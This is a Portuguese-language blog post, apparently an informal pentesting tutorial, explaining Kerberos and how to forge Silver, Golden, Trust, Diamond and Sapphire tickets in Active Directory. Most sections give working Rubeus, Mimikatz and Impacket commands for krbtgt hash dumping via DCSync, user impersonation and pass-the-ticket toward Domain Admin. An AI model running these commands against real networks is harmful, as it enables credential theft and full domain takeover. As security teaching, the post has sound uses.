---
title: 'Forjando Tickets do Kerberos'
layout: post
---

Forjando Tickets do Kerberos
===

![anaozinho foda forjando sla oq](https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8dbfd9e6-f858-45e7-a042-95aa86b75aba/dgfoyil-c97a86d1-0303-4d0f-a051-62740542d9a3.png/v1/fill/w_1182,h_676,q_70,strp/dwarven_steel__the_ironforge_legacy_by_bogi380_dgfoyil-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTA5OCIsInBhdGgiOiJcL2ZcLzhkYmZkOWU2LWY4NTgtNDVlNy1hMDQyLTk1YWE4NmI3NWFiYVwvZGdmb3lpbC1jOTdhODZkMS0wMzAzLTRkMGYtYTA1MS02Mjc0MDU0MmQ5YTMucG5nIiwid2lkdGgiOiI8PTE5MjAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.P1ZCrVtyq4QUq4qqMzVd4_DvqIzfJQUH41f55w59GB0)

[toc]

# Introdução
Resolvi escrever esse artigo pq sim, to entediado, e eu sei q o conteúdo desse artigo é de leigo, mas to sem ideia doq escrever msm, é isso.
# Kerberos
![image](https://hackmd.io/_uploads/r14yrsnNyx.png)
>cachorro endiabrado do capeta huaaaaaaaaarhrr half half har har

O Kerberos é um protocolo de autenticação que verifica as identidades de usuarios ou hosts utilizando um sistema de tickets digitais.

O Kerberos usa uma criptografia simétrica mas também pode usar criptografia assimétrica durante determinadas fases da autenticação, e o Kerberos usa a porta 88 (UDP) por padrão.

Basicamente no kerberos o cliente se autentica no AS (Authentication Server) do KDC (Key Distribution Center), que o KDC emite um TGT (ticket) criptografado com uma key do TGS (Ticket granting server), com o TGT o usuário pode se autenticar em diversos serviços, desde que o serviço esteja registrado no TGS com um SPN (Service Principal Name), dai o TGS retorna um ST (Service Ticket) e uma session key pro cliente.

Também gostaria de pontuar sobre o PAC ((Privileged Authentication Certificate), q é um conjunto de dados contidos num TGT/ST que tem informações sobre a respectiva conta, como nome do usuário, grupos q ele tá, etc...

E a LT-Key do KDC (Long-Term Key), q é a hash de uma conta, podendo ser RC4, DES/AES, etc...
## Silver Ticket
A LTKey de uma conta de um serviço pode ser usada para forjar um ST que pode mais tarde ser passado pelo Pass-the-ticket para acessar esse serviço, no caso o atacante vai forjar um ST com o PAC do usuario-alvo q ele quer acessar o serviço

Para criar um silver ticket, o atacante precisa encontrar a chave RC4 da conta de serviço alvo (ou seja, hash NT) ou a chave AES (128 ou 256 bits).

Isso pode ser feito capturando uma resposta NTLM (de preferência NTLMv1) e decifrando ela, ou dumpando secrets do LSA, tem N formas de fazer isso, mas n vou focar nisso agr.

Uma alternativa muito melhor e mais stealth pra fazer um silver ticket é abusar do **S4U2self** para se fazer passar por um usuario do domain com privilégios de admin **local** na máquina alvo.

Essa alternativa é superior pois enquanto um Silver Ticket normal é um Service Ticket que apresenta um PAC **forjado**, o Service Ticket emitido pelo S4U2self é legítimo e apresenta um PAC **válido**.

### Agora mão na massa:
Vou usar o Rubeus pra isso.

Pegando um TGT
```
Rubeus.exe tgtdeleg /nowrap
```
Usando o TGT pra pegar um Service Ticket com o S4U2self, se passando por outro user do domain
```
Rubeus.exe s4u /self /nowrap /impersonateuser:"USUARIO" /altservice:"cifs/MAQUINAAAAA" /ticket:"TICKET EM B64"

impersonateuser = usuario pra ser impersonated
     altservice = sname
         ticket = tgt (b64)
```
Ai dps que tu ter o Service Ticket, só fazer PTT pra pegar Domain Admin.

> Uma grande diferença do silver ticket pro golden ticket é q a hash necessária é mais fácil de obter e não necessita de uma comunicação com o DC quando é utilizada, deixando a detecção mais dificil doq a de um golden ticket (mas lembrando, hj em dia ambos são facilmente detectados)
## Golden Ticket
A LTKey da conta **KRBTGT** pode ser usada para forjar um TGT especial que pode ser usado pro Pass-the-ticket também, pra acessar qualquer recurso no domínio do AD.

A key do krbtgt é usada para encriptar o PAC, no Golden Ticket o atacante vai pegar a ltkey do krbtgt e vai forjar um PAC indicando que o usuario-alvo pertence a um grupo privilegiado, esse PAC vai ser incorporado num TGT forjado q vai ser usado pra solicitar Service Tickets q incluirão o PAC forjado pelo atacante

Pra fazer o Golden Ticket vc ja precisa ter um user com privilegios de admin no dc

Agora podemos pegar a hash do KRBTGT com o Mimikatz
```
mimikatz.exe "lsadump::dcsync /domain:DOMAINFODAA /user:krbtgt"

domain = domain alvo
  user = krbtgt, n muda isso
```
Agr vc pode usar o Mimikatz pra fazer o Golden Ticket, mas primeiro vc precisa do SID (Security Identifier) do DC, vc pode fazer isso com o WMI
```
wmic useraccount where name="TEU_USER" get sid

name = teu usuario atual no dc
```
Agora com o sID tu pode forjar o golden ticket com o Mimikatz ou o Rubeus, no caso eu usei o Mimikatz
```
mimikatz.exe "kerberos::golden /user:fds /domain:DOMAINFODAA /sid:SIDDDDD /aes256:HASHDOKRBTGT /ptt"

  user = usuario
domain = domain
   sid = sid
aes256 = hash do KRBTGT, pode ser RC4, aes128 etc, depende do ambiente, no caso foi aes256
   ptt = pass-the-ticket
```

### OPSEC - Silver/Golden
Os silver e golden tickets podem normalmente ser detectados por XDRs que monitorem qualquer pedido pro TGS `KRB_TGS_REQ` sem um pedido de TGT `KRB_AS_REQ` correspondente, sem contar que apresentam PACs forjados q muitas vezes n conseguem imitar um PAC real.
## Trust Ticket
Coloquei o Trust Ticket embaixo do Golden Ticket pq são semelhantes..

Os trust tickets são tickets forjados pra domain trusts.

Podemos criar o ticket com o mimikatz:
```
mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:SIDDD /rc4:HASH /user:Administrator /service:krbtgt /target:DOMAIN_ALVO /ticket:pica.kirbi"

 domain = domain atual
    sid = sid do admin do teu domain atual
    rc4 = HASH do krbtgt (como eu disse anteriormente, pd ser qualquer, aes256, etc..)
 target = domain-alvo pra tu acessar
service = servico 
 ticket = arquivo pra salvar o ticket gerado
```

Dps usa o ticket criado pra fazer uma req no TGS pra um serviço pro domain-alvo, podemos fazer isso pelo Rubeus
```
Rubeus.exe asktgs /ticket:pica.kirbi /service:cifs/DOMAINALVO /ptt /dc:DCALVO

 ticket = arquivo com o ticket criado
service = servico alvo (no caso foi CIFS)
     dc = dc alvo
```

Vc pode pegar uma forest inteira com um trust ticket, se vc pegar o SID do Enterprise Admin e forjar um ticket.
## Diamond Ticket
Os diamond tickets podem ser uma alternativa boa pro golden e silver ticket, na medida em que se limita a pedir um ticket normal, desencriptar o PAC, modificar, recalcular as assinaturas e encriptar novamente. E só requer o conhecimento da LTKey do serviço de destino (pode ser o krbtgt pra um TGT, ou um serviço de destino pra um Service Ticket).

O diamond ticket é bem similar ao Golden Ticket, porém mais stealth.

Rubeus:
```
Rubeus.exe diamond /domain:DOMAINFDS /user:USERFDS /password: BLUBLUBLE /dc:DCCCCC.DDC.DC /krbkey:KEYYYYYYdoKRBTGT /ticketuser:krbtgt  /ticketuserid:500 /groups:512 /ptt

      domain = domain
        user = usuario atual
    password = senha do usuario atual
          dc = domain controller
      krbkey = key do usuario
  ticketuser = usuario  q a tgt vai ser modificada
ticketuserid = id do usuario
      groups = id do grupo (512 é dos domain admin)
```
## Sapphire Ticket
O Sapphire Ticket é semelhante ao Diamond Ticket pois não é um ticket forjado, mas sim baseado num ticket legítimo obtido após um pedido.

A unica diferença é que o PAC no Diamond Ticket é modificado pra adicionar alguns grupos privilegiados ou é substituido por outro PAC forjado, enquanto no Sapphire Ticket o PAC é roubado de outro usuário com privilégios superiores, por meio do S4U2self e U2U.

Assim, se um usuario pedir um ST U2U de si próprio para si próprio pode desencriptá-lo e pegar o PAC e sua hash, isso significa q se tu conseguir escrever na propriedade `msDS-KeyCredentialLink` de um usuário já era.

No caso vou usar o Impacket, mais precisamente o `ticketer` do Impacket.
```
python3 ticketer.py -request -impersonate 'administrator' -domain 'domainnn' -user 'usuario' -password 'senha' -aesKey 'keyaes' -domain-sid 'siddomain' 'ignored'

    domain = domain
      user = user atual
  password = senha do user atual
    aeskey = hash do krbtgt
domain-sid = sid do domain
```
